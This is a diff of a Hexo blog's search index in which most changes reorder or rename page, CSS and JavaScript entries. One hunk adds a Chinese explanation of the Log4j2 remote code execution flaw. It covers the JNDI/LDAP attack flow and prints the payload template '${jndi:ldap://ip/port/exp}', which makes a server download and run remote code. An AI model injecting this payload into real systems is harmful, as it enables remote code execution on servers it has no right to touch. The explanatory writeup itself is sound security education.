@@ -4,7 +4,7 @@
   
     
     <entry>
-      <title>hexo Error： Spawn failed 解决方案</title>
+      <title>Hexo Error： Spawn failed 解决方案</title>
       <link href="/2022/12/06/126/"/>
       <url>/2022/12/06/126/</url>
       
@@ -21,7 +21,7 @@
       <link href="/2022/12/04/124/"/>
       <url>/2022/12/04/124/</url>
       
-        <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Apache Log4j2是一个基于Java的<strong>日志记录工具</strong>,该工具重了Log4j2框架，由于Apache Logj4c lookup功能存在<strong>递归解析功能</strong>,攻击者可直接构造恶意请求，无需进行特殊配置，即可触发远程代码执行。</p>]]></content>
+        <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Apache Log4j2是一个基于Java的<strong>日志记录工具</strong>,该工具重了Log4j2框架，由于Apache Logj4c lookup功能存在<strong>递归解析功能</strong>,攻击者可直接构造恶意请求，无需进行特殊配置，即可触发远程代码执行。</p><p>漏洞是怎么导致的？<br>下面是触发漏洞的两部分关键代码：</p><ol><li>org.apache.logging.log4j.core.pattern.MessagePatternConverter 的 format() 方法（表达式内容替换）：</li></ol><p>这部分内容重点就在于代码的主要内容就是一旦发现日志中包含 ${ 就会将表达式的内容替换为表达式解析后的内容，而不是表达式本身，从而导致攻击者构造符合要求的表达式供系统执行。</p><p> 在 ${ 中可以使用的关键词如下：<br> ${可替换的内容</p><p><img src="https://image.3001.net/images/20211217/1639712382_61bc067eaee08359d0c41.png!small?1639712383466"></p><ol><li>apache.logging.log4j.core.lookup.StrSubstitutor（提取字符串，并通过 lookup 进行内容替换）</li></ol><p>日志在打印时当遇到 ${ 后，Interpolator 类以:号作为分割，将表达式内容分割成两部分，前面部分作为 prefix，后面部分作为 key。然后通过 prefix 去找对应的 lookup，通过对应的 lookup 实例调用 lookup 方法，最后将 key 作为参数带入执行。</p><p>由于log4j2 支持很多协议，例如通过 ldap 查找变量，通过 docker 查找变量，通过rmi等等。目前看到使用最多的主要是使用ldap来构造payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://ip/port/exp&#125;</span><br></pre></td></tr></table></figure><p>最终效果就是通过 jndi 注入，借助 ldap 服务来下载执行恶意 payload，从而执行命令，整个利用流程如图所示：<br>利用流程图</p><p><img src="https://image.3001.net/images/20211217/1639712440_61bc06b85a207de73fde2.png!small?1639712441101"></p><p>整个利用流程分两步：</p><p>第一步：向目标发送指定 payload，目标对 payload 进行解析执行，然后会通过 ldap 链接远程服务，当 ldap 服务收到请求之后，将请求进行重定向到恶意 java class 的地址。</p><p>第二步：目标服务器收到重定向请求之后，下载恶意 class 并执行其中的代码，从而执行系统命令。</p><p>关于利用LDAP服务来进行注入攻击已经不是第一次了，JNDI注入，即某代码中存在JDNI的string可控的情况，可构造恶意RMI或者LDAP服务端，导致远程任意类被加载，造成任意代码执行。Fastjson RCE漏洞的利用也用到LDAP注入攻击，还有其他的一些。<br>JNDI注入中RMI和LDAP与JDK版本的关系</p><p><img src="https://image.3001.net/images/20211217/1639712463_61bc06cf985900ad0692b.png!small?1639712464093"></p>]]></content>
       
       
       
@@ -72,11 +72,11 @@
     
     
     <entry>
-      <title></title>
-      <link href="/js/runtime.js"/>
-      <url>/js/runtime.js</url>
+      <title>关于</title>
+      <link href="/about/index.html"/>
+      <url>/about/index.html</url>
       
-        <content type="html"><![CDATA[var now = new Date; function createtime () {     now.setTime(now.getTime() + 1e3);     var o = new Date("11/30/2022 23:00:00"), r = (now - o) / 1e3 / 60 / 60 / 24, i = Math.floor(r), n = (now - o) / 1e3 / 60 / 60 - 24 * i, s = Math.floor(n);     1 == String(s).length && (s = "0" + s);     var l = (now - o) / 1e3 / 60 - 1440 * i - 60 * s, g = Math.floor(l);     1 == String(g).length && (g = "0" + g);     var d = (now - o) / 1e3 - 86400 * i - 3600 * s - 60 * g, b = Math.round(d);     1 == String(b).length && (b = "0" + b);     let c = "";     c = s < 18 && s >= 9 ? `<img class='boardsign' src='https://img.shields.io/badge/F%E5%B0%8F%E5%B1%8B-%E4%B8%8A%E7%8F%AD%E6%91%B8%E9%B1%BC%E4%B8%AD-1ade23?style=social&logo=Buy%20Me%20A%20Coffee' title='距离月入25k也就还差一个大佬带我~'><br> 本站已运行了 ${i} 天 ${s} 小时 ${g} 分 ${b} 秒 <i id="heartbeat" class='fas fa-heartbeat'></i> <br> ✨为了再次看见你的笑脸✨ <br> ✨再びあなたの笑顔を見るために✨ ` : `<img class='boardsign' src='https://img.shields.io/badge/F小屋-打烊休息啦-6adea8?style=social&logo=coffeescript' title='下班了就该开开心心的玩耍，嘿嘿~'><br> 本站已运行了 ${i} 天 ${s} 小时 ${g} 分 ${b} 秒 <i id="heartbeat" class='fas fa-heartbeat'></i> <br> ✨为了再次看见你的笑脸✨ <br> ✨再びあなたの笑顔を見るために✨ `, document.getElementById("workboard") && (document.getElementById("workboard").innerHTML = c) } setInterval((() => { createtime() }), 1e3);]]></content>
+        <content type="html"><![CDATA[]]></content>
       
     </entry>
     
@@ -84,10 +84,10 @@
     
     <entry>
       <title></title>
-      <link href="/css/universe.css"/>
-      <url>/css/universe.css</url>
+      <link href="/css/custom.css"/>
+      <url>/css/custom.css</url>
       
-        <content type="html"><![CDATA[/* 背景宇宙星光  */#universe{    display: block;    position: fixed;    margin: 0;    padding: 0;    border: 0;    outline: 0;    left: 0;    top: 0;    width: 100%;    height: 100%;    pointer-events: none;    /* 这个是调置顶的优先级的，-1在文章页下面，背景上面，个人推荐这种 */    z-index: -1;  }]]></content>
+        <content type="html"><![CDATA[/* 页脚与头图透明 */#footer {  background: transparent !important;}#page-header {  background: transparent !important;}/* 白天模式遮罩透明 */#footer::before {  background: transparent !important;}#page-header::before {  background: transparent !important;}/* 夜间模式遮罩透明 */[data-theme="dark"] #footer::before {  background: transparent !important;}[data-theme="dark"] #page-header::before {  background: transparent !important;}]]></content>
       
     </entry>
     
@@ -106,32 +106,10 @@
     
     <entry>
       <title></title>
-      <link href="/css/custom.css"/>
-      <url>/css/custom.css</url>
+      <link href="/js/runtime.js"/>
+      <url>/js/runtime.js</url>
       
-        <content type="html"><![CDATA[/* 页脚与头图透明 */#footer {  background: transparent !important;}#page-header {  background: transparent !important;}/* 白天模式遮罩透明 */#footer::before {  background: transparent !important;}#page-header::before {  background: transparent !important;}/* 夜间模式遮罩透明 */[data-theme="dark"] #footer::before {  background: transparent !important;}[data-theme="dark"] #page-header::before {  background: transparent !important;}]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>关于</title>
-      <link href="/about/index.html"/>
-      <url>/about/index.html</url>
-      
-        <content type="html"><![CDATA[]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>电影</title>
-      <link href="/movies/index.html"/>
-      <url>/movies/index.html</url>
-      
-        <content type="html"><![CDATA[]]></content>
+        <content type="html"><![CDATA[var now = new Date; function createtime () {     now.setTime(now.getTime() + 1e3);     var o = new Date("11/30/2022 23:00:00"), r = (now - o) / 1e3 / 60 / 60 / 24, i = Math.floor(r), n = (now - o) / 1e3 / 60 / 60 - 24 * i, s = Math.floor(n);     1 == String(s).length && (s = "0" + s);     var l = (now - o) / 1e3 / 60 - 1440 * i - 60 * s, g = Math.floor(l);     1 == String(g).length && (g = "0" + g);     var d = (now - o) / 1e3 - 86400 * i - 3600 * s - 60 * g, b = Math.round(d);     1 == String(b).length && (b = "0" + b);     let c = "";     c = s < 18 && s >= 9 ? `<img class='boardsign' src='https://img.shields.io/badge/F%E5%B0%8F%E5%B1%8B-%E4%B8%8A%E7%8F%AD%E6%91%B8%E9%B1%BC%E4%B8%AD-1ade23?style=social&logo=Buy%20Me%20A%20Coffee' title='距离月入25k也就还差一个大佬带我~'><br> 本站已运行了 ${i} 天 ${s} 小时 ${g} 分 ${b} 秒 <i id="heartbeat" class='fas fa-heartbeat'></i> <br> ✨为了再次看见你的笑脸✨ <br> ✨再びあなたの笑顔を見るために✨ ` : `<img class='boardsign' src='https://img.shields.io/badge/F小屋-打烊休息啦-6adea8?style=social&logo=coffeescript' title='下班了就该开开心心的玩耍，嘿嘿~'><br> 本站已运行了 ${i} 天 ${s} 小时 ${g} 分 ${b} 秒 <i id="heartbeat" class='fas fa-heartbeat'></i> <br> ✨为了再次看见你的笑脸✨ <br> ✨再びあなたの笑顔を見るために✨ `, document.getElementById("workboard") && (document.getElementById("workboard").innerHTML = c) } setInterval((() => { createtime() }), 1e3);]]></content>
       
     </entry>
     
@@ -160,11 +138,33 @@
     
     
     <entry>
+      <title>电影</title>
+      <link href="/movies/index.html"/>
+      <url>/movies/index.html</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>标签</title>
       <link href="/tags/index.html"/>
       <url>/tags/index.html</url>
       
         <content type="html"><![CDATA[]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title></title>
+      <link href="/css/universe.css"/>
+      <url>/css/universe.css</url>
+      
+        <content type="html"><![CDATA[/* 背景宇宙星光  */#universe{    display: block;    position: fixed;    margin: 0;    padding: 0;    border: 0;    outline: 0;    left: 0;    top: 0;    width: 100%;    height: 100%;    pointer-events: none;    /* 这个是调置顶的优先级的，-1在文章页下面，背景上面，个人推荐这种 */    z-index: -1;  }]]></content>
       
     </entry>
     
